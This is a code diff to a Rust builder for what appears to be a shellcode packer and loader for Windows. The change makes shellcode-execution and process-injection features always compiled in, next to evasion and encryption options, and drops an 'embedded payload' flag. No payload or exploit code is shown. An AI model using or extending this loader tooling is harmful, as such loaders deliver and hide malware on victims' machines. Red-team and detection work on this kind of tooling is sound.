@@ -6,7 +6,6 @@ use std::env;
 use std::fs::File;
 use std::io::prelude::*;
 use crate::config::PackerConfig;
-use crate::payload::PayloadType;
 
 /// Represents a template module that can be included in the loader
 #[derive(Debug)]
@@ -116,14 +115,12 @@ pub const ADDITIONAL_FILES: &[AdditionalFile] = &[
     },
 ];
 
-pub fn build_compile_command(config: &PackerConfig, payload_type: &PayloadType) -> String {
+pub fn build_compile_command(config: &PackerConfig) -> String {
     let mut compile_command = "build --release ".to_string();
     
-    // Only include shellcode execution features for actual shellcode payloads
-    if matches!(payload_type, PayloadType::Shellcode) {
-        compile_command.push_str(&format!("--features {} ", config.execution_shellcode.feature_name()));
-        compile_command.push_str(&format!("--features {} ", config.injection_method.feature_name()));
-    }
+    // Always include shellcode execution and injection features
+    compile_command.push_str(&format!("--features {} ", config.execution.feature_name()));
+    compile_command.push_str(&format!("--features {} ", config.injection.feature_name()));
     
     // Add utility features
     for utility in &config.utils {
@@ -144,7 +141,6 @@ pub fn build_compile_command(config: &PackerConfig, payload_type: &PayloadType) 
         compile_command.push_str(&format!("--features {} ", encryption.feature_name()));
     }
     
-    compile_command.push_str("--features embedded ");
     compile_command.push_str("--manifest-path ./loader/Cargo.toml");
     compile_command.push_str(" --target x86_64-pc-windows-msvc");
     
@@ -242,13 +238,12 @@ pub fn display_feature_summary(config: &PackerConfig) {
         features.push(evasion.display_name());
     }
     
-    features.push(config.execution_shellcode.display_name());
-    features.push(config.injection_method.display_name());
+    features.push(config.execution.display_name());
+    features.push(config.injection.display_name());
     
     if let Some(encryption) = config.encrypt {
         features.push(encryption.display_name());
     }
-    features.push("Embedded Payload");
     
     if features.is_empty() {
         println!("[*] No additional features enabled");
